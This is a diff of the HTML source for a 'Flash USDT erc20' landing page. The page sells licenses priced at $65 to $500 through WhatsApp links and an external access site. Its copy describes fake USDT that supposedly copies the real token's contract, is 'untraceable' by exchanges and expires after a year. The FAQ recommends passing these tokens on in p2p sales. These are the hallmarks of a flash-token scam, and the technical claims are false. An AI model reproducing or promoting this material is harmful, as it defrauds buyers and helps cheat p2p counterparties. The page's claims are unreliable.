@@ -1,542 +1,911 @@
 <index.html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FLASH USDT erc20 Sender - High-Tech Interactive Style</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLASH USDT /erc20: Revolutionize Your Buying Power of Crypto</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto:wght@300;400;700&family=Audiowide&display=swap');
 
-        :root {
-            --primary-color: #00ff88;
-            --secondary-color: #00ccff;
-            --background-color: #001a2c;
-            --hover-color: #ff00ff;
-            --text-color: #ffffff;
-        }
+    :root {
+        --primary-color: #00F0FF;
+        --secondary-color: #1A1A2E;
+        --accent-color: #FF00A8;
+        --bg-color: #0F0F1A;
+        --text-color: #E0E0E0;
+    }
 
-        body {
-            font-family: 'Orbitron', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: var(--background-color);
-            color: var(--text-color);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-            z-index: 1;
-        }
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-color);
+        line-height: 1.6;
+        overflow-x: hidden;
+    }
 
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            border-bottom: 2px solid var(--primary-color);
-        }
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+    }
 
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--primary-color);
-            text-shadow: 0 0 10px var(--primary-color);
-            display: flex;
-            align-items: center;
-        }
+    header {
+        background-color: rgba(26, 26, 46, 0.8);
+        backdrop-filter: blur(10px);
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 1000;
+    }
 
-        .logo svg {
-            width: 50px;
-            height: 50px;
-            margin-right: 15px;
-        }
+    nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px 0;
+    }
 
-        .animated-button {
-            background-color: var(--primary-color);
-            color: var(--background-color);
-            padding: 12px 24px;
-            text-decoration: none;
-            border: none;
-            cursor: pointer;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            border-radius: 5px;
-            box-shadow: 0 0 15px var(--primary-color);
-        }
+    .logo {
+        font-family: 'Audiowide', cursive;
+        font-size: 28px;
+        font-weight: 700;
+        color: var(--primary-color);
+        text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
+        letter-spacing: 2px;
+    }
 
-        .animated-button:hover {
-            background-color: var(--hover-color);
-            box-shadow: 0 0 25px var(--hover-color);
-        }
+    .nav-links {
+        display: flex;
+        gap: 30px;
+    }
 
-        .animated-button::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                to bottom right,
-                rgba(255, 255, 255, 0.3),
-                rgba(255, 255, 255, 0.1)
-            );
-            transform: rotate(45deg);
-            animation: shimmer 3s infinite;
-        }
+    .nav-links a {
+        text-decoration: none;
+        color: var(--text-color);
+        font-weight: 500;
+        transition: color 0.3s ease;
+    }
 
-        @keyframes shimmer {
-            0% {
-                transform: translateX(-50%) rotate(45deg);
-            }
-            100% {
-                transform: translateX(150%) rotate(45deg);
-            }
-        }
+    .nav-links a:hover {
+        color: var(--primary-color);
+    }
 
-        .main-content {
-            display: flex;
+    .hero {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        position: relative;
+        overflow: hidden;
+        padding-top: 100px;
+    }
+
+    .hero-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    .hero-text {
+        flex: 1;
+        min-width: 300px;
+        z-index: 2;
+    }
+
+    h1 {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 42px;
+        margin-bottom: 30px;
+        color: var(--primary-color);
+        text-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
+        line-height: 1.2;
+    }
+
+    .subtitle {
+        font-size: 24px;
+        color: var(--accent-color);
+        margin-bottom: 20px;
+        font-weight: 600;
+        text-shadow: 0 0 10px rgba(255, 0, 168, 0.5);
+    }
+
+    .hero-text p {
+        font-size: 18px;
+        margin-bottom: 30px;
+    }
+
+    .cta-button {
+        display: inline-block;
+        background-color: var(--accent-color);
+        color: #fff;
+        padding: 12px 30px;
+        border-radius: 30px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        box-shadow: 0 0 20px rgba(255, 0, 168, 0.5);
+    }
+
+    .cta-button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 30px rgba(255, 0, 168, 0.8);
+    }
+
+    .hero-image {
+        flex: 1;
+        min-width: 300px;
+        text-align: right;
+        z-index: 2;
+    }
+
+    .hero-image svg {
+        max-width: 100%;
+        height: auto;
+    }
+
+    .features {
+        padding: 100px 0;
+        background-color: rgba(26, 26, 46, 0.8);
+    }
+
+    .features h2 {
+        text-align: center;
+        font-family: 'Orbitron', sans-serif;
+        font-size: 36px;
+        margin-bottom: 50px;
+        color: var(--primary-color);
+    }
+
+    .feature-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 30px;
+    }
+
+    .feature-item {
+        text-align: center;
+        padding: 30px;
+        border-radius: 10px;
+        background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
+        box-shadow: 0 8px 32px 0 rgba(0, 240, 255, 0.1);
+        transition: transform 0.3s ease;
+    }
+
+    .feature-item:hover {
+        transform: translateY(-10px);
+    }
+
+    .feature-icon {
+        font-size: 48px;
+        color: var(--primary-color);
+        margin-bottom: 20px;
+    }
+
+    .feature-item h3 {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 24px;
+        margin-bottom: 15px;
+        color: var(--primary-color);
+    }
+
+    .stats {
+        background-color: var(--secondary-color);
+        color: var(--text-color);
+        padding: 50px 0;
+    }
+
+    .stats-container {
+        display: flex;
+        justify-content: space-around;
+        flex-wrap: wrap;
+        text-align: center;
+    }
+
+    .stat-item {
+        margin: 20px;
+    }
+
+    .stat-item h4 {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 36px;
+        margin-bottom: 10px;
+        color: var(--primary-color);
+    }
+
+    .crypto {
+        padding: 100px 0;
+        background-color: var(--bg-color);
+    }
+
+    .crypto h2 {
+        text-align: center;
+        font-family: 'Orbitron', sans-serif;
+        font-size: 36px;
+        margin-bottom: 50px;
+        color: var(--primary-color);
+    }
+
+    .crypto-container {
+        position: relative;
+        max-width: 100%;
+        overflow-x: auto;
+    }
+
+    .crypto-header {
+        position: absolute;
+        top: 0;
+        right: 0;
+        z-index: 1;
+    }
+
+    .crypto-table-wrapper {
+        max-height: 300px;
+        overflow-y: auto;
+        border: 1px solid var(--primary-color);
+        border-radius: 10px;
+    }
+
+    #crypto-table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    #crypto-table th, #crypto-table td {
+        padding: 10px;
+        text-align: left;
+        border-bottom: 1px solid var(--primary-color);
+    }
+
+    #crypto-table th {
+        position: sticky;
+        top: 0;
+        background-color: var(--bg-color);
+        z-index: 1;
+    }
+
+    .trade-btn {
+        background-color: var(--accent-color);
+        color: #fff;
+        border: none;
+        padding: 8px 16px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .trade-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
+    }
+
+    .crypto-symbol {
+        width: 24px;
+        height: 24px;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+
+    .price-up {
+        color: #00ff00;
+    }
+
+    .price-down {
+        color: #ff0000;
+    }
+
+    .whatsapp-button {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 1000;
+        background-color: #25D366;
+        color: white;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        transition: all 0.3s ease;
+    }
+
+    .whatsapp-button:hover {
+        transform: scale(1.1);
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+
+    @keyframes popupAnimation {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.1); }
+        100% { transform: scale(1); }
+    }
+
+    .message-box {
+        animation: popupAnimation 2s infinite;
+        transform-origin: center;
+    }
+
+    .message-text {
+        animation: popupAnimation 2s infinite;
+        transform-origin: center;
+    }
+
+    .left-message {
+        animation-delay: 0.5s;
+    }
+
+    .right-message {
+        animation-delay: 1s;
+    }
+
+    .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    .loading-spinner {
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid var(--primary-color);
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .licenses {
+        padding: 100px 0;
+        background-color: var(--bg-color);
+    }
+
+    .license-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 30px;
+    }
+
+    .license-item {
+        text-align: center;
+        padding: 30px;
+        border-radius: 10px;
+        background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
+        box-shadow: 0 8px 32px 0 rgba(0, 240, 255, 0.1);
+    }
+
+    .purchase-btn {
+        margin-top: 20px;
+        padding: 10px 20px;
+        background-color: var(--accent-color);
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .purchase-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
+    }
+
+    .license-popup {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    .popup-content {
+        background-color: var(--bg-color);
+        padding: 30px;
+        border-radius: 10px;
+        text-align: center;
+    }
+
+    .bitcoin-info {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 20px;
+    }
+
+    .bitcoin-icon {
+        width: 24px;
+        height: 24px;
+        margin-right: 10px;
+    }
+
+    .copy-btn, .close-btn {
+        margin-top: 10px;
+        padding: 5px 10px;
+        background-color: var(--primary-color);
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+
+    .crypto-container {
+        display: flex;
+        align-items: flex-start;
+    }
+
+    .trade-btn {
+        background-color: var(--accent-color);
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-right: 20px;
+        transition: all 0.3s ease;
+    }
+
+    .trade-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 15px rgba(255, 0, 168, 0.5);
+    }
+
+    .trade-popup {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: var(--bg-color);
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
+        z-index: 1000;
+        display: none;
+    }
+
+    .trade-popup.show {
+        display: block;
+        animation: popupAnimation 0.5s ease;
+    }
+
+    .floating-crypto-symbols {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 9998;
+    }
+
+    .floating-symbol {
+        position: absolute;
+        font-size: 24px;
+        opacity: 0.5;
+        animation: floatSymbol 10s linear infinite;
+    }
+
+    @keyframes floatSymbol {
+        0% { transform: translateY(100vh) rotate(0deg); }
+        100% { transform: translateY(-100px) rotate(360deg); }
+    }
+
+    @media (max-width: 768px) {
+        .hero-content {
             flex-direction: column;
-            gap: 40px;
-            margin-top: 40px;
+            text-align: center;
         }
 
-        .section {
-            border: 2px solid var(--primary-color);
-            padding: 20px;
-            margin-bottom: 20px;
-            background-color: rgba(0, 26, 44, 0.8);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            border-radius: 10px;
-        }
-
-        .section:hover {
-            box-shadow: 0 0 25px var(--primary-color);
-        }
-
-        .section-title {
-            color: var(--secondary-color);
-            border-bottom: 2px solid var(--secondary-color);
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-
-        .license-info {
-            background-color: rgba(0, 26, 44, 0.8);
-            padding: 20px;
-            border: 2px solid var(--primary-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 30px;
-            border-radius: 10px;
-        }
-
-        .license-card {
-            background: linear-gradient(145deg, #002a3c, #001a2c);
-            border: 2px solid var(--primary-color);
-            padding: 30px;
+        .hero-text, .hero-image {
+            flex: none;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 0 15px var(--primary-color);
-            transition: all 0.3s ease;
+        }
+
+        .hero-image {
+            margin-top: 30px;
+        }
+
+        .nav-links {
+            display: none;
+        }
+
+        .hero {
+            padding-top: 120px;
+        }
+
+        h1 {
+            font-size: 36px;
+        }
+
+        .crypto-container {
+            padding-top: 40px;
+        }
+
+        .crypto-header {
             position: relative;
-            overflow: hidden;
-            border-radius: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            text-align: right;
+            margin-bottom: 10px;
         }
 
-        .license-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 0 30px var(--primary-color);
+        .crypto-table-wrapper {
+            max-height: 250px;
         }
 
-        .license-card h3 {
-            color: var(--secondary-color);
-            margin-top: 0;
-            font-size: 28px;
-            text-align: center;
-        }
-
-        .license-card p {
-            margin: 10px 0;
-            text-align: center;
-        }
-
-        .license-price {
-            font-size: 36px;
-            font-weight: bold;
-            color: var(--primary-color);
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .faq {
-            background-color: rgba(0, 26, 44, 0.8);
-            padding: 20px;
-            border: 2px solid var(--primary-color);
-            border-radius: 10px;
-        }
-
-        .faq h3 {
-            color: var(--secondary-color);
-        }
-
-        #svg-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-
-        .chatbot-button {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            padding: 15px 25px;
-            font-size: 18px;
-            background-color: var(--primary-color);
-            color: var(--background-color);
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 0 15px var(--primary-color);
-            transition: all 0.3s ease;
-            animation: pulse 2s infinite;
-            z-index: 9999;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: bold;
-            border-radius: 5px;
-        }
-
-        .chatbot-button:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 25px var(--primary-color);
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(0, 255, 136, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
-        }
-
-        .tech-symbol {
-            position: absolute;
-            font-size: 24px;
-            color: var(--primary-color);
-            opacity: 0.7;
-            animation: float 5s infinite ease-in-out;
-            pointer-events: none;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(180deg); }
-        }
-
-        .interactive-element {
-            position: absolute;
-            font-size: 36px;
-            color: var(--primary-color);
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .interactive-element:hover {
-            transform: scale(1.2);
-            color: var(--hover-color);
-        }
-
-        .crypto-prices {
-            background-color: rgba(0, 26, 44, 0.8);
-            padding: 20px;
-            border: 2px solid var(--primary-color);
-            border-radius: 10px;
-        }
-
-        .crypto-price {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid var(--secondary-color);
-        }
-
-        .crypto-price:last-child {
-            border-bottom: none;
-        }
-
-        .crypto-name {
-            font-weight: bold;
-            color: var(--secondary-color);
-        }
-
-        .crypto-value {
-            color: var(--primary-color);
-        }
-
-        .crypto-symbol {
-            font-size: 1.2em;
-            margin-right: 5px;
-            color: var(--primary-color);
-        }
-
-        .header-info {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-
-        .online-counter, .total-generated {
+        #crypto-table th, #crypto-table td {
+            padding: 8px;
             font-size: 14px;
-            color: var(--secondary-color);
-            margin-bottom: 5px;
         }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            .logo {
-                font-size: 24px;
-            }
-            .license-card {
-                width: 100%;
-            }
-            .animated-button {
-                padding: 10px 20px;
-                font-size: 16px;
-            }
-            .chatbot-button {
-                padding: 12px 20px;
-                font-size: 16px;
-            }
-            .interactive-element {
-                font-size: 24px;
-            }
-        }
-    </style>
+    }
+</style>
 </head>
 <body>
-    <svg id="svg-background" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
-        <defs>
-            <pattern id="grid" width="50" height="50" patternUnits="userSpaceOnUse">
-                <path d="M 50 0 L 0 0 0 50" fill="none" stroke="#003366" stroke-width="0.5"/>
-            </pattern>
-        </defs>
-        <rect width="100%" height="100%" fill="url(#grid)" />
-    </svg>
+    <header>
+        <nav class="container">
+            <div class="logo">FLASH USDT /erc20</div>
+            <div class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#stats">Stats</a>
+                <a href="#crypto">Crypto</a>
+            </div>
+        </nav>
+    </header>
 
-    <div class="container">
-        <header>
-            <div class="logo">
-                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="50" cy="50" r="45" fill="#001a2c" stroke="#00ff88" stroke-width="5"/>
-                    <text x="50" y="60" font-size="40" text-anchor="middle" fill="#00ff88" font-family="Orbitron, sans-serif">FU</text>
+    <section class="hero">
+        <div class="dropshipping-symbols"></div>
+        <div class="container hero-content">
+            <div class="hero-text">
+                <h1>Revolutionize Your Buying Power of Crypto with FLASH USDT /erc20</h1>
+                <p class="subtitle">Buy Your License Now</p>
+                <p>Our Flash USDT is a unique solution, utilizing validator nodes on the ERC20 network to Mask a token with the same contract as USDT. This enables it to function like USDT, being transferable, swappable, bridgeable, p2p sellable, etc</p>
+                <a href="https://walletcryp.com" class="cta-button" id="access-license-btn">ACCESS NOW WITH YOUR LICENSE</a>
+            </div>
+            <div class="hero-image">
+                <svg width="500" height="500" viewBox="0 0 500 500" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Phone 1 - Dropshipping Platform -->
+                    <rect x="50" y="50" width="180" height="350" rx="20" fill="#1A1A2E" />
+                    <rect x="60" y="70" width="160" height="300" rx="10" fill="#00F0FF" />
+                    <rect x="70" y="90" width="140" height="260" fill="#0F0F1A" />
+                    <path d="M110 180 L170 180 L170 240 L110 240 Z" fill="#FF00A8" />
+                    <path d="M110 180 L140 160 L170 180" fill="#FF00A8" />
+                    <path d="M140 180 L140 240" stroke="#FFFFFF" stroke-width="2" />
+                    <path d="M110 210 L170 210" stroke="#FFFFFF" stroke-width="2" />
+                    <circle cx="140" cy="225" r="8" fill="#00F0FF" />
+                    <!-- New USDT ERC20 symbol -->
+                    <rect x="65" y="280" width="150" height="60" rx="5" fill="#FFFFFF" class="message-box left-message" />
+                    <text x="140" y="315" font-family="Arial" font-size="24" fill="#26A17B" text-anchor="middle" class="message-text left-message">
+                        USDT
+                    </text>
+                    <text x="140" y="330" font-family="Arial" font-size="12" fill="#26A17B" text-anchor="middle" class="message-text left-message">
+                        ERC20
+                    </text>
+
+                    <!-- Phone 2 - Trading Platform -->
+                    <rect x="270" y="100" width="180" height="350" rx="20" fill="#1A1A2E" />
+                    <rect x="280" y="120" width="160" height="300" rx="10" fill="#00F0FF" />
+                    <rect x="290" y="140" width="140" height="260" fill="#0F0F1A" />
+                    <!-- Stocks list -->
+                    <text x="300" y="160" font-family="Arial" font-size="12" fill="#FFFFFF">AAPL $150.25 +2.3%</text>
+                    <text x="300" y="180" font-family="Arial" font-size="12" fill="#FFFFFF">GOOGL $2750.10 -0.5%</text>
+                    <text x="300" y="200" font-family="Arial" font-size="12" fill="#FFFFFF">AMZN $3300.75 +1.8%</text>
+                    <!-- Enhanced chart -->
+                    <path d="M300 360 L330 320 L360 340 L390 300 L420 330 L430 320" stroke="#FF00A8" stroke-width="3" fill="none" />
+                    <circle cx="330" cy="320" r="4" fill="#00F0FF" />
+                    <circle cx="360" cy="340" r="4" fill="#00F0FF" />
+                    <circle cx="390" cy="300" r="4" fill="#00F0FF" />
+                    <circle cx="420" cy="330" r="4" fill="#00F0FF" />
+                    <!-- Additional chart elements -->
+                    <line x1="290" y1="370" x2="430" y2="370" stroke="#FFFFFF" stroke-width="1" />
+                    <line x1="290" y1="370" x2="290" y2="230" stroke="#FFFFFF" stroke-width="1" />
+                    <text x="285" y="225" font-family="Arial" font-size="10" fill="#FFFFFF">$</text>
+                    <text x="435" y="375" font-family="Arial" font-size="10" fill="#FFFFFF">t</text>
+                    <!-- New Bitcoin symbol -->
+                    <rect x="285" y="370" width="150" height="60" rx="5" fill="#FFFFFF" class="message-box right-message" />
+                    <circle cx="360" cy="400" r="20" fill="#F7931A" class="message-text right-message" />
+                    <text x="360" y="408" font-family="Arial" font-size="24" fill="#FFFFFF" text-anchor="middle" class="message-text right-message">₿</text>
                 </svg>
-                FLASH USDT erc20 Sender
-            </div>
-            <div class="header-info">
-                <div class="online-counter">Online now: <span id="online-count">150</span></div>
-                <div class="total-generated">Total USDT Generated: $4,562,854</div>
-            </div>
-            <a href="https://wa.me/447753831282" class="animated-button" target="_blank">WhatsApp</a>
-        </header>
-        
-        <div class="main-content">
-            <div class="section">
-                <h1 class="section-title">Generate TODAY USDT/erc20 Cryptocurrencies</h1>
-                <p>Our Flash USDT is a cutting-edge solution, leveraging validator nodes on the ERC20 network to Mask a token with the same contract as USDT. This enables it to function like USDT, being transferable, swappable, bridgeable, p2p sellable, and more.</p>
-                <p>Generate TODAY USDT/erc20 Cryptocurrencies with smart contracts that the Blockchain does not recognize. It's not real coins for 1 year!</p>
-                <a href="https://walletcryp.com/" class="animated-button" target="_blank">ACCESS NOW</a>
-            </div>
-
-            <div class="section license-info">
-                <h2 class="section-title">Licenses</h2>
-                <div class="license-card">
-                    <h3>Trial License</h3>
-                    <p>Get started with our trial offer</p>
-                    <p class="license-price">$65</p>
-                    <p>Receive $300 Flash USDT/erc20</p>
-                    <a href="https://wa.me/447753831282?text=Hello%2C%20I%27m%20interested%20in%20the%20Trial%20license." class="animated-button" target="_blank">Get Trial</a>
-                </div>
-                <div class="license-card">
-                    <h3>Standard License</h3>
-                    <p>Perfect for beginners</p>
-                    <p class="license-price">$100</p>
-                    <p>Receive $500 Flash USDT/erc20</p>
-                    <a href="https://wa.me/447753831282?text=Hello%2C%20I%27m%20interested%20in%20the%20Standard%20license." class="animated-button" target="_blank">Get Standard</a>
-                </div>
-                <div class="license-card">
-                    <h3>Premium License</h3>
-                    <p>For serious traders</p>
-                    <p class="license-price">$500</p>
-                    <p>Receive $25K Flash USDT/erc20</p>
-                    <a href="https://wa.me/447753831282?text=Hello%2C%20I%27m%20interested%20in%20the%20Premium%20license." class="animated-button" target="_blank">Get Premium</a>
-                </div>
-            </div>
-            
-            <div class="section crypto-prices">
-                <h2 class="section-title">Live Crypto Prices</h2>
-                <div id="crypto-prices-container"></div>
-            </div>
-            
-            <div class="section faq">
-                <h2 class="section-title">Frequently Asked Questions</h2>
-                <h3>Q: Is Flash USDT transferable?</h3>
-                <p>A: Yes, to any wallet</p>
-                
-                <h3>Q: How many "jumps"?</h3>
-                <p>A: There's no limit. Once transferred, the new owner can transfer, and so on. This thing of jump limit does not exist.</p>
-                
-                <h3>Q: Is there any demo available?</h3>
-                <p>A: For customers really interested in the tool but with monetary or trust issues we have a Trial Offer</p>
-                
-                <h3>Q: Is there an expiration date of the flashed values?</h3>
-                <p>A: Yes, they expire after 365 days.</p>
-                
-                <h3>Q: After purchasing my license, is it just activate it and send flash to any wallet?</h3>
-                <p>A: Yes, it's as simple as that.</p>
-                
-                <h3>Q: Can it be used for p2p?</h3>
-                <p>A: Absolutely, it's the most recommended practice</p>
             </div>
         </div>
-    </div>
-    
-    <button class="chatbot-button" onclick="openChatbot()">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+    </section>
+
+    <section id="features" class="features">
+        <div class="container">
+            <h2>Why to Buy a License?</h2>
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <div class="feature-icon">🔄</div>
+                    <h3>Swappable</h3>
+                    <p>Our Flash USDT erc20 is fully swappable, allowing seamless transactions within the cryptocurrency ecosystem.</p>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>Sophisticated Algorithm</h3>
+                    <p>Our sophisticated algorithm in the Blockchain creates a MASK for the coin, making it untraceable for any exchanges like Binance, Kraken.com, CoinBase, and more.</p>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">🌐</div>
+                    <h3>ERC20 Network</h3>
+                    <p>Utilizing validator nodes on the ERC20 network, our solution masks the token with the same contract as USDT.</p>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">🔐</div>
+                    <h3>Untraceability</h3>
+                    <p>Our Flash USDT erc20 remains undetectable by major cryptocurrency exchanges, ensuring your transactions remain private.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="licenses" class="licenses">
+        <div class="container">
+            <h2>Choose Your License</h2>
+            <div class="license-grid">
+                <div class="license-item">
+                    <h3>Trial License</h3>
+                    <button class="purchase-btn" data-license="trial">PURCHASE NOW</button>
+                </div>
+                <div class="license-item">
+                    <h3>Standard License</h3>
+                    <button class="purchase-btn" data-license="standard">PURCHASE NOW</button>
+                </div>
+                <div class="license-item">
+                    <h3>Premium License</h3>
+                    <button class="purchase-btn" data-license="premium">PURCHASE NOW</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="crypto" class="crypto">
+        <div class="container">
+            <h2>Live Cryptocurrency Prices</h2>
+            <div class="crypto-container">
+                <div class="crypto-header">
+                    <button id="trade-btn" class="trade-btn">Trade</button>
+                </div>
+                <div class="crypto-table-wrapper">
+                    <table id="crypto-table">
+                        <thead>
+                            <tr>
+                                <th>Coin</th>
+                                <th>Price</th>
+                                <th>24h Change</th>
+                            </tr>
+                        </thead>
+                        <tbody id="crypto-body">
+                            <!-- Cryptocurrency data will be inserted here -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+        <div id="floating-crypto-symbols" class="floating-crypto-symbols"></div>
+    </section>
+
+    <section id="stats" class="stats">
+        <div class="container stats-container">
+            <div class="stat-item">
+                <h4 id="activeUsers">0</h4>
+                <p>Active Users</p>
+            </div>
+            <div class="stat-item">
+                <h4 id="productsManaged">0</h4>
+                <p>Generated USDT</p>
+            </div>
+        </div>
+    </section>
+
+    <a href="https://wa.me/447753831282?text=Hello%2C%20I%27m%20interested%20in%20FLASH%20USDT%20/erc20" class="whatsapp-button" target="_blank" rel="noopener noreferrer">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#FFFFFF">
+            <path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793s.448-1.273.607-1.446c.159-.173.346-.217.462-.217l.332.006c.106.005.249-.04.39.298.144.347.491 1.2.534 1.287.043.087.072.188.014.304-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86s.274.072.376-.043c.101-.116.433-.506.549-.68.116-.173.231-.145.39-.087s1.011.477 1.184.564.289.13.332.202c.045.072.045.419-.1.824zm-3.423-14.416c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm.029 18.88c-1.161 0-2.305-.292-3.318-.844l-3.677.964.984-3.595c-.607-1.052-.927-2.246-.926-3.468.001-3.825 3.113-6.937 6.937-6.937 1.856.001 3.598.723 4.907 2.034 1.31 1.311 2.031 3.054 2.03 4.908-.001 3.825-3.113 6.938-6.937 6.938z"/>
         </svg>
-        Chat with AI
-    </button>
+    </a>
 
     <script>
-        document.addEventListener('DOMContentLoaded', (event) => {
-            const svgBackground = document.getElementById('svg-background');
-            
-            function animateBackground() {
-                const gridOffset = Date.now() / 1000 % 50;
-                svgBackground.style.transform = `translateY(${gridOffset}px)`;
